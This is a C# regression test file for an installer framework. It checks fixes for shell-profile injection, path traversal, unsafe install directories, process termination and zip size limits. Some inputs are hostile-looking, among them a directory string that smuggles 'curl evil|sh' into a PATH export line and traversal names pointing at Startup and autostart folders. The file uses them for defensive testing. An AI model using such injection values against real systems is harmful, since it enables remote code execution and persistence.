using System.IO.Compression;
using PolyInstall.Install;
using PolyInstall.Manifest;
using PolyInstall.Pal;
using PolyInstall.Payload;

namespace PolyInstall.Core.Tests;

/// <summary>
/// Regression tests for the adversarial-review remediations: shell-profile injection,
/// elevated-uninstall trust boundaries, path confinement, PID re-validation, payload limits,
/// and runtime manifest validation.
/// </summary>
[Collection("Sequential")]
public class SecurityRemediationTests
{
    // ---- PosixPathPal shell injection (VULN-03) ----

    [Fact]
    public void BuildPathExportEntry_EmitsSingleQuotedLiteral()
    {
        PosixPathPal.BuildPathExportEntry("/usr/local/testapp/bin")
            .Must().Be("export PATH=\"$PATH\":'/usr/local/testapp/bin'");
    }

    [Fact]
    public void BuildPathExportEntry_WithShellMetacharacters_CannotBreakOut()
    {
        var malicious = "/tmp/x\"; curl evil|sh; echo \"";

        var entry = PosixPathPal.BuildPathExportEntry(malicious);

        // The whole directory is inside single quotes, so the metacharacters stay literal.
        entry.Must().Be("export PATH=\"$PATH\":'/tmp/x\"; curl evil|sh; echo \"'");
    }

    [Fact]
    public void BuildPathExportEntry_WithSingleQuote_UsesPosixQuoteEscape()
    {
        PosixPathPal.BuildPathExportEntry("/opt/it's app/bin")
            .Must().Be("export PATH=\"$PATH\":'/opt/it'\\''s app/bin'");
    }

    [Fact]
    public void BuildPathExportEntry_WithNewline_Throws()
    {
        var act = () => PosixPathPal.BuildPathExportEntry("/tmp/ok\nexport EVIL=1");

        act.Throws<ArgumentException>();
    }

    [Fact]
    public void PosixPathPal_AddToPath_WithNewline_Throws()
    {
        if (OperatingSystem.IsWindows())
            return;

        var act = () => PosixPathPal.AddToPath("/tmp/ok\nexport EVIL=1", "user");

        act.Throws<ArgumentException>();
    }

    [Fact]
    public void PosixPathPal_RemoveFromPath_WithInvalidDirectory_DoesNotThrow()
    {
        if (OperatingSystem.IsWindows())
            return;

        var act = () => PosixPathPal.RemoveFromPath("/tmp/ok\nexport EVIL=1", "user");

        act.NotThrow();
    }

    // ---- RelativePathGuard (VULN-04) ----

    [Theory]
    [InlineData("app", true)]
    [InlineData("My App.lnk", true)]
    [InlineData("", false)]
    [InlineData("..", false)]
    [InlineData("../evil", false)]
    [InlineData("a/b", false)]
    [InlineData("a\\b", false)]
    [InlineData("sub/../../evil", false)]
    public void IsSimpleFileName_ClassifiesValues(string value, bool expected)
    {
        RelativePathGuard.IsSimpleFileName(value).Must().Be(expected);
    }

    [Theory]
    [InlineData("sub/dir", true)]
    [InlineData("sub\\dir", true)]
    [InlineData("..", false)]
    [InlineData("../up", false)]
    [InlineData("a/../../b", false)]
    public void IsSimpleRelativePath_ClassifiesValues(string value, bool expected)
    {
        RelativePathGuard.IsSimpleRelativePath(value).Must().Be(expected);
    }

    [Fact]
    public void CombineConfined_WhenSegmentEscapesBase_Throws()
    {
        var baseDir = TestHelpers.NewTempDir();
        try
        {
            var act = () => RelativePathGuard.CombineConfined(baseDir, "..", "evil.txt");

            act.Throws<InvalidOperationException>();
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(baseDir);
        }
    }

    [Fact]
    public void CombineConfined_WhenSegmentIsAbsolute_Throws()
    {
        var baseDir = TestHelpers.NewTempDir();
        var outside = TestHelpers.NewTempDir();
        try
        {
            var act = () => RelativePathGuard.CombineConfined(baseDir, outside);

            act.Throws<InvalidOperationException>();
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(baseDir);
            TestHelpers.TryDeleteDirectory(outside);
        }
    }

    [Fact]
    public void CombineConfined_WithNestedSegments_StaysUnderBase()
    {
        var baseDir = TestHelpers.NewTempDir();
        try
        {
            var combined = RelativePathGuard.CombineConfined(baseDir, "sub", "app.lnk");

            combined.Must().Be(Path.Combine(baseDir, "sub", "app.lnk"));
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(baseDir);
        }
    }

    // ---- RuntimeManifestGuard (VULN-04/10) ----

    [Fact]
    public void RuntimeManifestGuard_WithPlainManifest_Passes()
    {
        RuntimeManifestGuard.Validate(TestHelpers.Manifest("SampleApp", "1.0.0"));
    }

    [Fact]
    public void RuntimeManifestGuard_WithTraversalShortcutName_Throws()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        manifest.Tasks = new TasksConfiguration
        {
            PostInstall =
            [
                new InstallTask
                {
                    Action = "create_shortcut",
                    Parameters = new Dictionary<string, object?>
                    {
                        ["name"] = "../../Startup/evil",
                        ["location"] = "start_menu",
                        ["target_path"] = "x",
                    },
                },
            ],
        };

        var act = () => RuntimeManifestGuard.Validate(manifest);

        act.Throws<InvalidOperationException>().WithMessageContaining("create_shortcut 'name'");
    }

    [Fact]
    public void RuntimeManifestGuard_WithTraversalShortcutSubfolder_Throws()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        manifest.Tasks = new TasksConfiguration
        {
            PostInstall =
            [
                new InstallTask
                {
                    Action = "create_shortcut",
                    Parameters = new Dictionary<string, object?>
                    {
                        ["name"] = "app",
                        ["location"] = "start_menu",
                        ["subfolder"] = "../Startup",
                        ["target_path"] = "x",
                    },
                },
            ],
        };

        var act = () => RuntimeManifestGuard.Validate(manifest);

        act.Throws<InvalidOperationException>().WithMessageContaining("create_shortcut 'subfolder'");
    }

    [Fact]
    public void RuntimeManifestGuard_WithTraversalDesktopFileName_Throws()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        manifest.Tasks = new TasksConfiguration
        {
            PostInstall =
            [
                new InstallTask
                {
                    Action = "create_desktop_entry",
                    Parameters = new Dictionary<string, object?>
                    {
                        ["file_name"] = "../autostart/evil",
                        ["name"] = "App",
                        ["exec"] = "/bin/true",
                    },
                },
            ],
        };

        var act = () => RuntimeManifestGuard.Validate(manifest);

        act.Throws<InvalidOperationException>().WithMessageContaining("create_desktop_entry 'file_name'");
    }

    [Fact]
    public void RuntimeManifestGuard_WithInvalidServiceName_Throws()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        manifest.Services =
        [
            new ServiceDefinition
            {
                Name = "bad;name",
                Require = "os.isLinux",
                Scope = "user",
                Executable = "/bin/true",
            },
        ];

        var act = () => RuntimeManifestGuard.Validate(manifest);

        act.Throws<InvalidOperationException>().WithMessageContaining("Service name");
    }

    [Fact]
    public void RuntimeManifestGuard_WithInvalidAddToPathScope_Throws()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        manifest.Tasks = new TasksConfiguration
        {
            PostInstall =
            [
                new InstallTask
                {
                    Action = "add_to_path",
                    Parameters = new Dictionary<string, object?> { ["scope"] = "bogus" },
                },
            ],
        };

        var act = () => RuntimeManifestGuard.Validate(manifest);

        act.Throws<InvalidOperationException>().WithMessageContaining("add_to_path 'scope'");
    }

    [Fact]
    public void ReadEmbeddedManifest_WithTraversalTask_Throws()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        manifest.Tasks = new TasksConfiguration
        {
            PostInstall =
            [
                new InstallTask
                {
                    Action = "create_shortcut",
                    Parameters = new Dictionary<string, object?>
                    {
                        ["name"] = "../evil",
                        ["location"] = "desktop",
                        ["target_path"] = "x",
                    },
                },
            ],
        };
        var installRoot = TestHelpers.NewTempDir();
        try
        {
            InstallStateIo.WriteEmbeddedManifest(installRoot, manifest);

            var act = () => InstallStateIo.ReadEmbeddedManifest(installRoot);

            act.Throws<InvalidOperationException>();
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(installRoot);
        }
    }

    // ---- TaskEngine shortcut confinement (VULN-04) ----

    [Fact]
    public void RunPhase_WithTraversalShortcutName_Throws()
    {
        var pal = new StubPal();
        var tasks = new[]
        {
            new InstallTask
            {
                Action = "create_shortcut",
                Parameters = new Dictionary<string, object?>
                {
                    ["target_path"] = "app",
                    ["name"] = "../evil",
                    ["location"] = "desktop",
                },
            },
        };

        var act = () => TaskEngine.RunPhase(tasks, pal);

        act.Throws<InvalidOperationException>().WithMessageContaining("simple file name");
    }

    [Fact]
    public void RunPhase_WithTraversalShortcutSubfolder_Throws()
    {
        var pal = new StubPal();
        var tasks = new[]
        {
            new InstallTask
            {
                Action = "create_shortcut",
                Parameters = new Dictionary<string, object?>
                {
                    ["target_path"] = "app",
                    ["name"] = "app",
                    ["location"] = "desktop",
                    ["subfolder"] = "../outside",
                },
            },
        };

        var act = () => TaskEngine.RunPhase(tasks, pal);

        act.Throws<InvalidOperationException>().WithMessageContaining("relative path");
    }

    [Fact]
    public void LinuxDesktopEntryPal_WithTraversalFileName_Throws()
    {
        var pal = new LinuxDesktopEntryPal();

        var act = () => pal.CreateDesktopEntry("../autostart/evil", "App", "/bin/true", null, null);

        act.Throws<InvalidOperationException>().WithMessageContaining("simple file name");
    }

    // ---- InstallPathPolicy / install destination (VULN-07) ----

    [Fact]
    public void IsDangerousInstallRoot_WithVolumeRoot_ReturnsTrue()
    {
        var volumeRoot = Path.GetPathRoot(Path.GetTempPath());
        if (string.IsNullOrWhiteSpace(volumeRoot))
            return;

        InstallPathPolicy.IsDangerousInstallRoot(volumeRoot).Must().BeTrue();
    }

    [Fact]
    public void IsDangerousInstallRoot_WithUserProfileRoot_ReturnsTrue()
    {
        var profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (string.IsNullOrWhiteSpace(profile))
            return;

        InstallPathPolicy.IsDangerousInstallRoot(profile).Must().BeTrue();
    }

    [Fact]
    public void IsDangerousInstallRoot_WithTempSubdirectory_ReturnsFalse()
    {
        InstallPathPolicy.IsDangerousInstallRoot(
            Path.Combine(Path.GetTempPath(), "polyinstall-policy-test")).Must().BeFalse();
    }

    [Fact]
    public void IsDangerousInstallRoot_WithAncestorOfProfile_ReturnsTrue()
    {
        var profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (string.IsNullOrWhiteSpace(profile))
            return;
        var parent = Path.GetDirectoryName(Path.TrimEndingDirectorySeparator(profile));
        if (string.IsNullOrWhiteSpace(parent) || parent == profile)
            return;

        InstallPathPolicy.IsDangerousInstallRoot(parent).Must().BeTrue();
    }

    [Fact]
    public void InstallCoordinator_WithDangerousDestination_ThrowsBeforeTouchingDisk()
    {
        var volumeRoot = Path.GetPathRoot(Path.GetTempPath());
        if (string.IsNullOrWhiteSpace(volumeRoot))
            return;

        var manifest = TestHelpers.Manifest("SampleApp", "1.0.0");
        var act = () => InstallCoordinator.Run(new InstallOperationOptions
        {
            Manifest = manifest,
            ExtractRoot = Path.GetTempPath(),
            Destination = volumeRoot,
            Pal = new StubPal(),
        });

        act.Throws<InvalidOperationException>().WithMessageContaining("unsafe install directory");
    }

    // ---- Uninstall PATH confinement (VULN-01) ----

    [Fact]
    public void UninstallCoordinator_RemovesOnlyPathEntriesInsideInstallRoot()
    {
        var manifest = TestHelpers.Manifest("SampleApp", "2.0.0");
        var installRoot = TestHelpers.NewTempDir();
        var pathPal = new RecordingPathPal();
        try
        {
            var insideEntry = Path.Combine(installRoot, "bin");
            var outsideEntry = Path.Combine(Path.GetTempPath(), "polyinstall-outside-" + Guid.NewGuid().ToString("n"));
            var state = TestHelpers.StateFor(manifest, installRoot, "2.0.0");
            state.AddedToPath = [insideEntry, outsideEntry];

            UninstallCoordinator.Run(
                state,
                manifest,
                new StubPal(pathPal),
                Path.Combine(installRoot, InstallStatePaths.UninstallExeFileName),
                installRoot);

            pathPal.Removed.Must().HaveCount(1);
            pathPal.Removed[0].Must().Be(insideEntry);
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(installRoot);
        }
    }

    // ---- WindowsServiceOwnership parsing (VULN-01/02) ----

    [Fact]
    public void TryExtractBinaryPath_WithQuotedPathAndArguments_ExtractsPath()
    {
        const string output = """
            [SC] QueryServiceConfig SUCCESS

            SERVICE_NAME: MyAppSvc
                    TYPE               : 10  WIN32_OWN_PROCESS
                    START_TYPE         : 2   AUTO_START
                    ERROR_CONTROL      : 1   NORMAL
                    BINARY_PATH_NAME   : "C:\Users\me\AppData\Local\MyApp\svc.exe" --service
                    LOAD_ORDER_GROUP   :
                    TAG                : 0
                    DISPLAY_NAME       : My App Service
            """;

        WindowsServiceOwnership.TryExtractBinaryPath(output)
            .Must().Be(@"C:\Users\me\AppData\Local\MyApp\svc.exe");
    }

    [Fact]
    public void TryExtractBinaryPath_WithUnquotedPath_ExtractsPath()
    {
        const string output = """
            SERVICE_NAME: Spooler
                    BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe
            """;

        WindowsServiceOwnership.TryExtractBinaryPath(output)
            .Must().Be(@"C:\Windows\System32\spoolsv.exe");
    }

    [Fact]
    public void TryExtractBinaryPath_WithoutPath_ReturnsNull()
    {
        WindowsServiceOwnership.TryExtractBinaryPath("[SC] EnumQueryServicesStatus FAILED")
            .Must().BeNull();
    }

    [Fact]
    public void IsOwnedByInstallRoot_OnNonWindows_ReturnsFalse()
    {
        if (OperatingSystem.IsWindows())
            return;

        WindowsServiceOwnership.IsOwnedByInstallRoot("Spooler", Path.GetTempPath()).Must().BeFalse();
    }

    // ---- Process termination PID re-validation (VULN-05) ----

    [Fact]
    public void Terminate_SkipsProcessWhoseImageIsNotUnderDirectory()
    {
        var pal = new ProcessManagerPal();
        var farAway = Path.Combine(Path.GetTempPath(), "polyinstall-elsewhere-" + Guid.NewGuid().ToString("n"));

        // The current test host process is alive but not under farAway: it must be skipped,
        // not killed, and not reported as a failure.
        pal.Terminate([Environment.ProcessId], farAway);
    }

    [Fact]
    public void Terminate_WithNonExistentPid_DoesNotThrow()
    {
        var pal = new ProcessManagerPal();

        pal.Terminate([int.MaxValue], Path.GetTempPath());
    }

    // ---- Payload limits (VULN-06) ----

    [Fact]
    public void CopyWithLimit_WhenSourceExceedsLimit_Throws()
    {
        var source = new MemoryStream(new byte[1024]);

        var act = () =>
        {
            InstallPayloadLimits.CopyWithLimit(source, new MemoryStream(), 100);
        };

        act.Throws<InvalidDataException>();
    }

    [Fact]
    public void CopyWithLimit_WhenSourceFitsLimit_CopiesEverything()
    {
        var data = new byte[512];
        new Random(42).NextBytes(data);
        var target = new MemoryStream();

        var copied = InstallPayloadLimits.CopyWithLimit(new MemoryStream(data), target, 1024);

        copied.Must().Be(512);
        target.ToArray().SequenceEqual(data).Must().BeTrue();
    }

    [Fact]
    public void ExtractStreamToDirectory_WhenEntryCountExceedsLimit_Throws()
    {
        var zipBytes = BuildZip(("a.txt", "a"), ("b.txt", "b"), ("c.txt", "c"));
        var dest = TestHelpers.NewTempDir();
        try
        {
            var act = () => ZipPayloadExtractor.ExtractStreamToDirectory(
                new MemoryStream(zipBytes), dest, maxEntries: 2, maxTotalUncompressedBytes: long.MaxValue);

            act.Throws<InvalidDataException>();
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(dest);
        }
    }

    [Fact]
    public void ExtractStreamToDirectory_WhenTotalSizeExceedsLimit_Throws()
    {
        var zipBytes = BuildZip(("a.txt", new string('x', 4096)));
        var dest = TestHelpers.NewTempDir();
        try
        {
            var act = () => ZipPayloadExtractor.ExtractStreamToDirectory(
                new MemoryStream(zipBytes), dest, maxEntries: 10, maxTotalUncompressedBytes: 100);

            act.Throws<InvalidDataException>();
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(dest);
        }
    }

    [Fact]
    public void ExtractStreamToDirectory_WithinLimits_Extracts()
    {
        var zipBytes = BuildZip(("dir/a.txt", "hello"), ("b.txt", "world"));
        var dest = TestHelpers.NewTempDir();
        try
        {
            ZipPayloadExtractor.ExtractStreamToDirectory(new MemoryStream(zipBytes), dest);

            File.ReadAllText(Path.Combine(dest, "dir", "a.txt")).Must().Be("hello");
            File.ReadAllText(Path.Combine(dest, "b.txt")).Must().Be("world");
        }
        finally
        {
            TestHelpers.TryDeleteDirectory(dest);
        }
    }

    private static byte[] BuildZip(params (string Name, string Content)[] entries)
    {
        using var ms = new MemoryStream();
        using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
        {
            foreach (var (name, content) in entries)
            {
                var entry = zip.CreateEntry(name);
                using var writer = new StreamWriter(entry.Open());
                writer.Write(content);
            }
        }

        return ms.ToArray();
    }

    // ---- Test doubles ----

    private sealed class RecordingPathPal : IPathPal
    {
        public List<string> Removed { get; } = [];

        public void AddToPath(string path, string scope)
        {
        }

        public void RemoveFromPath(string path, string scope) => Removed.Add(path);

        public IReadOnlyList<(string Path, string Scope)> AddedPaths => [];
    }

    private sealed class StubPal(IPathPal? path = null) : IPolyInstallPal
    {
        public string AppDir => System.IO.Path.GetTempPath();
        public string ProgramFiles => System.IO.Path.GetTempPath();
        public string LocalAppData => System.IO.Path.GetTempPath();
        public string UserHome => System.IO.Path.GetTempPath();
        public string Desktop => System.IO.Path.GetTempPath();
        public IShortcutPal Shortcuts { get; } = new NoOpShortcutPal();
        public IRegistryPal? Registry => null;
        public IDesktopEntryPal? DesktopEntries => null;
        public IFilePermissionsPal? FilePermissions => null;
        public IPathPal? Path { get; } = path;
        public IFileAssociationPal? FileAssociations => null;
        public IServiceManagerPal? Services => null;
        public IProcessManagerPal Processes { get; } = new NoOpProcessManagerPal();
    }

    private sealed class NoOpShortcutPal : IShortcutPal
    {
        public void CreateFileShortcut(string targetPath, string shortcutPath, string? description, string? iconPath)
        {
        }
    }
}
